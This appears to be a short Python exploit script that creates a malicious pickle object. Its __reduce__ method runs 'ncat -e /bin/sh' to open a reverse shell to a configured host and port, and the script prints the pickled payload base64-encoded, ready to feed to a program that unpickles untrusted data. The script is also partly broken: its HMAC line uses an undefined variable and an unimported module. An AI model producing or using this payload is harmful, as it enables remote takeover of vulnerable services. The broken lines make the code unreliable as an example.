#!/usr/bin/python3

import pickle
import base64
import os
import sys
import hmac



lhost = "127.0.0.0"
lport = "9000"

class REVSHELL(object):
    def __reduce__(self):
        return (os.system, (f"ncat -e /bin/sh -nv {lhost} {lport} ",))
    
digest =  hmac.new('unique-key-here', data, hashlib.blake2b).hexdigest()
serialPayload = pickle.dumps(REVSHELL())
payload = base64.b64encode(serialPayload)


print(payload)